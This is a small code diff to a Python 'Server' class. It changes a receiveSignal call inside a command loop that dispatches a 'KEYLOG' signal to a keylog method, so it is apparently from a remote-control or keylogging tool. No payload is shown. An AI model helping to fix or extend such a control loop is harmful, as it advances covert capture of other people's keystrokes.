@@ -455,7 +455,7 @@ class Server:
                 self.nw = ns
 
             while True:
-                s = self.receiveSignal()
+                s = self.receiveSignal(client)
                 print(s)
                 if s == "KEYLOG":
                     self.keylog()
